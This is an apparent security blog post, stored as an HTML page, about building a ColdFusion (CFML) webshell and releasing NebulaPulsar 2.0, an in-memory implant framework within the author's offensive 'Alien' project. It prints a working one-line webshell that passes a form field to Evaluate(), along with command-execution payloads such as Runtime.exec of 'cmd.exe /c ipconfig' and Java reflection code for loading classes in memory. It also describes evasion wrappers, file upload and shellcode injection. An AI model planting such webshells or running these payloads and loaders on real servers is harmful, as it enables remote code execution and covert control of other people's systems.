@@ -1,0 +1,311 @@
+<!DOCTYPE html><html lang="en-us" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>NebulaPulsar 2.0: CFM Webshell and New Features | ISSAC/iss4cf0ng's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":true,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
+ menuSettings: {
+   zoom: "None"
+ },
+ showMathMenu: false,
+ jax: ["input/TeX","output/CommonHTML"],
+ extensions: ["tex2jax.js"],
+ TeX: {
+   extensions: ["AMSmath.js","AMSsymbols.js"],
+   equationNumbers: {
+     autoNumber: "AMS"
+   }
+ },
+ tex2jax: {
+   inlineMath: [["\\(", "\\)"]],
+   displayMath: [["\\[", "\\]"]]
+ }
+});</script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><script async src="https://www.googletagmanager.com/gtag/js?id=G-RQ7HTMYT8W"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-RQ7HTMYT8W');</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ISSAC/iss4cf0ng's blog" type="application/atom+xml">
+</head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/About/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/Alien/"><span class="navItemTitle">Alien</span></a></li><li class="navItem"><a class="navBlock" href="/2026/01/28/2026-1-28-ToolsDuplexSpy-v2-0-0/"><span class="navItemTitle">DuplexSpy</span></a></li><li class="navItem"><a class="navBlock" href="/Notes/"><span class="navItemTitle">Notes</span></a></li><li class="navItem"><a class="navBlock" href="/Series/"><span class="navItemTitle">Series</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>NebulaPulsar 2.0: CFM Webshell and New Features</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2026-07-01T07:51:36.000Z" id="date"> 2026-07-01</time></div></span><br><span>Last Update: <div class="control"><time datetime="2026-07-01T09:13:14.327Z" id="updated"> 2026-07-01</time></div></span><br><span>Word Count: <div class="control">1k</div></span><br><span>Read Time: <div class="control">6 min</div></span></div></div><hr><div id="post-content"><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article introduces NebulaPulsar 2.0 (I can’t believe a new version came out this quickly). In addition, it documents my research into developing a webshell for <strong>ColdFusion Markup Language (CFML)</strong> .</p>
+<p>If you are unfamiliar with NebulaPulsar, you may want to read this previous article first: <a href="/2026/06/27/2026-6-27-NebulaPulsar/">Click me!</a>.</p>
+<h1 id="Disclaimer"><a href="#Disclaimer" class="headerlink" title="Disclaimer"></a>Disclaimer</h1><p>This tool is intended for educational purposes only and serves as a proof-of-concept for the <a target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/Alien">Alien</a> project. Please do not use it for any illegal purposes. The author is not responsible for any damages caused by this project.</p>
+<p align="center" class='item-img' data-src='/images/meme/mika_punch.jpg'><img src="/images/meme/mika_punch.jpg" width=600/>
+</p>
+
+<h1 id="ColdFusion-Markup-Language"><a href="#ColdFusion-Markup-Language" class="headerlink" title="ColdFusion Markup Language"></a>ColdFusion Markup Language</h1><p>ColdFusion Markup Language, more commonly known as CFML, is a scripting language for web development that runs on the Java virtual machine (JVM), the .NET framework, and Google App Engine. Several commercial and free and open-source software implementations of CFML engines are available, including Adobe ColdFusion, Lucee, New Atlanta BlueDragon (Java and .NET versions), Railo, Open BlueDragon, and other CFML server engines. —— <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/ColdFusion_Markup_Language">Wikipedia</a></p>
+<h2 id="Why-Studying-CFML"><a href="#Why-Studying-CFML" class="headerlink" title="Why Studying CFML?"></a>Why Studying CFML?</h2><p>Recently, I have been rewritting <a target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/Alien">Alien</a>. My goal is to make Alien capable of targeting multiple platforms. Although CFML is a relatively old language (much older than I am), it is still widely used in both legacy and modern web applications, particularly in academic institutions, healthcare systems, and government agencies.</p>
+<p>Therefore, I believe that studying CFML security is still important today.</p>
+<h2 id="My-First-CFM-Webshell"><a href="#My-First-CFM-Webshell" class="headerlink" title="My First CFM Webshell"></a>My First CFM Webshell</h2><p>At the beginning, after installing <strong>Lucee</strong> (an open-source CFML engine) on my virtual machine, I could not find any publicly available CFML webshell capable of arbitrary code execution. As a result, I started learning the CFM language itself<sup><a href="#fn_1" id="reffn_1">1</a></sup> and eventually built my first CFML webshell:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coldfusion">&lt;cfif isDefined(&quot;form.pass&quot;)&gt;&lt;cfset Evaluate(form.pass)&gt;&lt;/cfif&gt;<br></code></pre></td></tr></table></figure>
+<p>The CFM webshell can be exploited with the payload below:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pass=WriteOutput(dump(server))<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-7-1-NebulaPulsar2-0/1.png'><img src="/images/article/2026-7-1-NebulaPulsar2-0/1.png" width=700/>
+</p>
+
+<p>At first glance, this seemed sufficient for integrating CFML support into Alien. However, I then realized that the practical implementation would be much more difficult than expected because <code>Evaluate()</code> does not allow multiple statements to be executed directly.</p>
+<p>For example, the following payload does not work:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pass=WriteOutput(&quot;1&quot;);WriteOutput(&quot;2&quot;);<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-7-1-NebulaPulsar2-0/2.png'><img src="/images/article/2026-7-1-NebulaPulsar2-0/2.png" width=700/>
+    <figcaption>
+    Error!
+    </figcaption>
+</p>
+
+<p>After studying how <code>evaluate()</code> works in Lucee, I discovered the following workaround:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pass=[WriteOutput(&quot;&lt;h1&gt;1&lt;/h1&gt;&quot;), WriteOutput(&quot;&lt;h1&gt;2&lt;/h1&gt;&quot;)]<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-7-1-NebulaPulsar2-0/3.png'><img src="/images/article/2026-7-1-NebulaPulsar2-0/3.png" width=700/>
+</p>
+
+<p>It works! However, integrating this approach into Alien would still be difficult because <strong>Alien injects an additional wrapper function (EventHorizon) for evasion</strong>. In addition, I discovered that there are two major CFML engines: Lucee and Adobe ColdFusion. This means that a payload working on Lucee may not necessarily work on Adobe ColdFusion, making cross-platform support considerbly more challenging…</p>
+<p align="center" class='item-img' data-src='/images/meme/toki_skill_issue.jpg'><img src="/images/meme/toki_skill_issue.jpg" width=250/>
+</p>
+
+<h2 id="Breakthroughs"><a href="#Breakthroughs" class="headerlink" title="Breakthroughs"></a>Breakthroughs</h2><p>So…had I really ran out all possible options?</p>
+<p>Then I remembered that CFML is a scripting language running on the Java Virtual Machine (JVM). After reading the official Lucee documentation, I discovered that it is possible to directly invoke Java classes from CFML.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">CreateObject(<span class="hljs-string">&quot;java&quot;</span>, <span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>)<br></code></pre></td></tr></table></figure>
+<p>Therefore, the CFM webshell can be exploited with the following payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pass=WriteOutput(CreateObject(&quot;java&quot;, &quot;org.apache.commons.io.IOUtils&quot;).toString(CreateObject(&quot;java&quot;, &quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;cmd.exe /c ipconfig&quot;).getInputStream(), &quot;UTF-8&quot;))<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-7-1-NebulaPulsar2-0/4.png'><img src="/images/article/2026-7-1-NebulaPulsar2-0/4.png" width=800/>
+</p>
+
+<p>At this point, an idea came to mind:</p>
+<blockquote>
+<p>If Java is available inside CFML, can <strong>NebulaPulsar</strong> be deployed through it?</p>
+</blockquote>
+<p>The answer is <strong>YES</strong>, with a few modifications. In fact, this eventually lead to a major upgrade: NebulaPulsar 2.0, which is considerably more flexible than the previous version.</p>
+<h2 id="NebulaPulsar-2-0"><a href="#NebulaPulsar-2-0" class="headerlink" title="NebulaPulsar 2.0"></a>NebulaPulsar 2.0</h2><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>In the previous version, NebulaPulsar directly imported JSP APIs for handling HTTP requests and responses:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">PageContext</span> <span class="hljs-variable">pageContext</span> <span class="hljs-operator">=</span> (PageContext)obj;<br><span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> (HttpServletResponse)pageContext.getResponse();<br><span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest)pageContext.getRequest();<br></code></pre></td></tr></table></figure>
+<p>These JSP APIs are unavailable in CFML. Although both JSP and CFML run on Java, they are built on different web frameworks and exposes different APIs. One possible solution would be to develop a separate NebulaPulsar implant specifically for CFML.</p>
+<p>However, while reviewing one of my previous articles on reverse engineering different RATs, I noticed an interesting implementation: dynamically resolving Windows APIs at runtime for evasion purposes.</p>
+<blockquote>
+<p>So, can I apply the same idea to NebulaPulsar?</p>
+</blockquote>
+<p>The answer is: <strong>Absolutely!</strong></p>
+<p>Instead of depending on JSP classes directly, NebulaPulsar can obtain the required objects through Java reflection.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Method</span> <span class="hljs-variable">fnGetResponse</span> <span class="hljs-operator">=</span> objPageContext.getClass().getMethod(<span class="hljs-string">&quot;getResponse&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]);<br>objResponse = fnGetResponse.invoke(objPageContext, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]);<br><br><span class="hljs-type">Method</span> <span class="hljs-variable">fnGetRequest</span> <span class="hljs-operator">=</span> objPageContext.getClass().getMethod(<span class="hljs-string">&quot;getRequest&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]);<br>objRequest = fnGetRequest.invoke(objPageContext, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]);<br><br><span class="hljs-type">Method</span> <span class="hljs-variable">fnGetContentLength</span> <span class="hljs-operator">=</span> objRequest.getClass().getMethod(<span class="hljs-string">&quot;getContentLength&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]);<br><span class="hljs-type">int</span> <span class="hljs-variable">nContentLength</span> <span class="hljs-operator">=</span> (Integer)fnGetContentLength.invoke(objRequest, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]);<br></code></pre></td></tr></table></figure>
+<p>What about the ClassLoader used for reflective loading? Fortunately, the overall approach remains the same, we simply need to invoke it through reflection as well.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">objTransientLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URLClassLoader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL[<span class="hljs-number">0</span>], <span class="hljs-built_in">this</span>);<br>java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">fnDefineMethod</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>fnDefineMethod.setAccessible(<span class="hljs-literal">true</span>);<br>clazzTarget = (Class&lt;?&gt;)fnDefineMethod.invoke(objTransientLoader, abClassBytes, <span class="hljs-number">0</span>, abClassBytes.length);<br></code></pre></td></tr></table></figure>
+<p>At this point, the major compatibility issue between JSP and CFML had been solved.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">fnSetAttribute.invoke(objRequest, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;pulsar_loader_instance&quot;</span>, <span class="hljs-built_in">this</span>&#125;);<br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Method</span> <span class="hljs-variable">fnGetRequest</span> <span class="hljs-operator">=</span> objPageContext.getClass().getMethod(<span class="hljs-string">&quot;getRequest&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]);<br><span class="hljs-type">Object</span> <span class="hljs-variable">objRequest</span> <span class="hljs-operator">=</span> fnGetRequest.invoke(objPageContext, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]);<br><br><span class="hljs-type">Method</span> <span class="hljs-variable">fnGetAttribute</span> <span class="hljs-operator">=</span> objRequest.getClass().getMethod(<span class="hljs-string">&quot;getAttribute&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;);<br><span class="hljs-type">Object</span> <span class="hljs-variable">objPulsarLoader</span> <span class="hljs-operator">=</span> fnGetAttribute.invoke(objRequest, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;pulsar_loader_instance&quot;</span>&#125;);<br></code></pre></td></tr></table></figure>
+<p>With these changes in place, it was finally time to test the new versions of NebulaPulsar and DarkMatter.</p>
+<p align="center" class='item-img' data-src='/images/article/2026-7-1-NebulaPulsar2-0/5.png'><img src="/images/article/2026-7-1-NebulaPulsar2-0/5.png" width=800/>
+</p>
+
+<h3 id="New-Features-for-Java-and-NET-DarkMatter"><a href="#New-Features-for-Java-and-NET-DarkMatter" class="headerlink" title="New Features for Java and .NET DarkMatter"></a>New Features for Java and .NET DarkMatter</h3><p>Since version 2.0, NebulaPulsar has become a sub-project of Alien, serving as a platform for demonstrating new ideas and experimenting with different implementation techniques.</p>
+<p>The following features have been added:</p>
+<ul>
+<li>Java<ul>
+<li>File upload</li>
+<li>Reflective load (*.class)</li>
+</ul>
+</li>
+<li>.NET<ul>
+<li>File upload</li>
+<li>Reflective load (*.exe)</li>
+<li>Shellcode injection</li>
+</ul>
+</li>
+</ul>
+<p>In addition, the CFML and JSPX webshells are now available on <a target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/NebulaPulsar/">GitHub</a>.</p>
+<h4 id="Demonstration"><a href="#Demonstration" class="headerlink" title="Demonstration"></a>Demonstration</h4><p align="center" class='item-img' data-src='/images/article/2026-7-1-NebulaPulsar2-0/6.png'><img src="/images/article/2026-7-1-NebulaPulsar2-0/6.png" width=800/>
+    <figcaption>
+    Upload file
+    </figcaption>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-7-1-NebulaPulsar2-0/7.png'><img src="/images/article/2026-7-1-NebulaPulsar2-0/7.png" width=800/>
+    <figcaption>
+    Shellcode injection (.NET)
+    </figcaption>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-7-1-NebulaPulsar2-0/8.png'><img src="/images/article/2026-7-1-NebulaPulsar2-0/8.png" width=800/>
+    <figcaption>
+    calc.exe (.NET)
+    </figcaption>
+</p>
+
+<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><blockquote id="fn_1">
+<sup>1</sup>. <a target="_blank" rel="noopener" href="https://docs.lucee.org/reference/functions/evaluate.html">https://docs.lucee.org/reference/functions/evaluate.html</a><a href="#reffn_1" title="Jump back to footnote [1] in the text."> &#8617;</a>
+</blockquote>
+<h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING"></a>THANKS FOR READING</h1><p align="center" class='item-img' data-src='/images/meme/Wallpaper/working.jpg'><img src="/images/meme/Wallpaper/working.jpg" width=700/>
+</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2026/06/27/2026-6-27-NebulaPulsar/">NebulaPulsar: A Proof-of-Concept In-Memory Implant Framework for JSP and ASP.NET Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="utterances-sel"></button></div><div id="utterances-container"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/" width="200" id="logo"><img src="https://avatars.githubusercontent.com/u/110074064?v=4" alt="Logo"></a><h1 id="Dr"><a href="/">ISSAC</a></h1><div id="description"><p>Everything is failing...</p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://x.com/iss4c_f0ng/"><i class="fab fa-twitter" alt="X"></i></a></div><div id="rss-feed"><a class="social" id="rss-copy-button" href="javascript:void(0)" title="Copy RSS link to clipboard"><span>RSS</span></a></div></div><div id="music"></div><div class="music-box"><hr style="border:1px solid #ccc; margin:10px 0"><p class="music-title">Feeling exhausted? Let's enjoy (やさしい) music!</p><p style="text-align:center; position: relative"><img class="music-anime" id="anime-img" src="/images/meme/himari_coffee.2.jpg" width="150" height="200"></p><div style="text-align:center"><button class="music-btn" id="music-prev">⏮</button><button class="music-btn" id="music-toggle">▶ Play Music</button><button class="music-btn" id="music-next">⏭</button></div><div style="margin-top:5px"><span id="music-index"></span></div><hr style="border:1px solid #ccc; margin:10px 0"><audio id="bg-music"><source src="/mp3/music/music_1.mp3" type="audio/mpeg"></audio><script>document.addEventListener("DOMContentLoaded", function () {
+  var playlist = [
+    "/mp3/music/music_1.mp3",
+    "/mp3/music/sugar_story.mp3",
+    "/mp3/music/story_music_box.mp3",
+    "/mp3/music/last_page.mp3",
+    "/mp3/music/sunset_memory.mp3",
+    "/mp3/music/welcome_home.mp3",
+    "/mp3/music/canon.mp3",
+    "/mp3/music/arigadou.mp3",
+  ];
+
+  var current = 0;
+  const audio = document.getElementById("bg-music");
+  const btn = document.getElementById("music-toggle");
+  const prevBtn = document.getElementById("music-prev");
+  const nextBtn = document.getElementById("music-next");
+  const indexDisplay = document.getElementById("music-index");
+
+  function updateDisplay() {
+    indexDisplay.innerText = `Currently: ${current + 1} / ${playlist.length}`;
+  }
+
+  updateDisplay();
+
+  btn.addEventListener("click", function () {
+    if (audio.paused) {
+      audio.src = playlist[current];
+      audio.play();
+      btn.innerText = "⏸ Pause Music";
+    } else {
+      audio.pause();
+      btn.innerText = "▶ Play Music";
+    }
+  });
+
+  nextBtn.addEventListener("click", function () {
+    const wasPlaying = !audio.paused;
+
+    current = (current + 1) % playlist.length;
+
+    audio.src = playlist[current];
+    audio.load();
+
+    if (wasPlaying) {
+      audio.play();
+    }
+
+    updateDisplay();
+  });
+
+  prevBtn.addEventListener("click", function () {
+    const wasPlaying = !audio.paused;
+
+    current--;
+
+    if (current < 0)
+      current = playlist.length - 1;
+
+    audio.src = playlist[current];
+    audio.load();
+
+    if (wasPlaying) {
+      audio.play();
+    }
+
+    updateDisplay();
+  });
+
+  audio.addEventListener("ended", function() {
+    current = (current + 1) % playlist.length;
+    audio.src = playlist[current];
+    audio.play();
+    updateDisplay();
+  });
+});
+</script><script>document.addEventListener("DOMContentLoaded", function () {
+  const animeImg = document.getElementById("anime-img");
+
+  animeImg.addEventListener("click", function() {
+    
+    const tip = document.createElement("div");
+    tip.innerText = "?";
+    tip.style.position = "absolute";
+    tip.style.top = "-50px";
+    tip.style.left = "50%";
+    tip.style.transform = "translateX(-50%)";
+    tip.style.backgroundColor = "#fff";
+    tip.style.color = "rgb(16, 174, 11)";
+    tip.style.padding = "2px 6px";
+    tip.style.border = "1px solid #ccc";
+    tip.style.borderRadius = "8px";
+    tip.style.boxShadow = "0 3px 6px rgba(0,0,0,0.2)";
+    tip.style.fontSize = "50px";
+    tip.style.fontWeight = "bold";
+    tip.style.zIndex = "1000";
+    tip.style.opacity = "1";
+    tip.style.transition = "opacity 1s, top 1s";
+    
+    animeImg.parentElement.appendChild(tip);
+
+    setTimeout(() => {
+      tip.style.opacity = "0";
+      tip.style.top = "-60px";
+      setTimeout(() => tip.remove(), 1000);
+    }, 2000);
+  });
+});
+</script><script>document.addEventListener("DOMContentLoaded", function () {
+  const rssBtn = document.getElementById("rss-copy-button");
+
+  rssBtn.addEventListener("click", async () => {
+    const rssUrl = window.location.origin + "/atom.xml";
+    try {
+      await navigator.clipboard.writeText(rssUrl);
+
+      const tip = document.createElement("div");
+      tip.innerText = "RSS link copied!";
+      tip.style.position = "absolute";
+      tip.style.top = "-30px";
+      tip.style.left = "50%";
+      tip.style.transform = "translateX(-50%)";
+      tip.style.backgroundColor = "#0d0d0d";
+      tip.style.color = "#00fff7";
+      tip.style.border = "1px solid #ff00ff";
+      tip.style.boxShadow = "0 0 8px #ff00ff, 0 0 16px #00fff7";
+      tip.style.padding = "2px 6px";
+      tip.style.borderRadius = "8px";
+      tip.style.fontSize = "14px";
+      tip.style.fontWeight = "bold";
+      tip.style.zIndex = "1000";
+      tip.style.opacity = "1";
+      tip.style.transition = "opacity 1s, top 1s";
+
+      rssBtn.style.position = "relative";
+      rssBtn.appendChild(tip);
+
+      setTimeout(() => {
+        tip.style.opacity = "0";
+        tip.style.top = "-40px";
+        setTimeout(() => tip.remove(), 1000);
+      }, 2000);
+
+    } catch (err) {
+      console.error("Failed to copy: ", err);
+    }
+  });
+});
+</script></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Disclaimer"><span class="toc-number">2.</span> <span class="toc-text">Disclaimer</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ColdFusion-Markup-Language"><span class="toc-number">3.</span> <span class="toc-text">ColdFusion Markup Language</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Why-Studying-CFML"><span class="toc-number">3.1.</span> <span class="toc-text">Why Studying CFML?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#My-First-CFM-Webshell"><span class="toc-number">3.2.</span> <span class="toc-text">My First CFM Webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Breakthroughs"><span class="toc-number">3.3.</span> <span class="toc-text">Breakthroughs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NebulaPulsar-2-0"><span class="toc-number">3.4.</span> <span class="toc-text">NebulaPulsar 2.0</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java"><span class="toc-number">3.4.1.</span> <span class="toc-text">Java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#New-Features-for-Java-and-NET-DarkMatter"><span class="toc-number">3.4.2.</span> <span class="toc-text">New Features for Java and .NET DarkMatter</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Demonstration"><span class="toc-number">3.4.2.1.</span> <span class="toc-text">Demonstration</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#References"><span class="toc-number">4.</span> <span class="toc-text">References</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#THANKS-FOR-READING"><span class="toc-number">5.</span> <span class="toc-text">THANKS FOR READING</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/custom.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script><script src="/js/slide.js"></script></body></html>
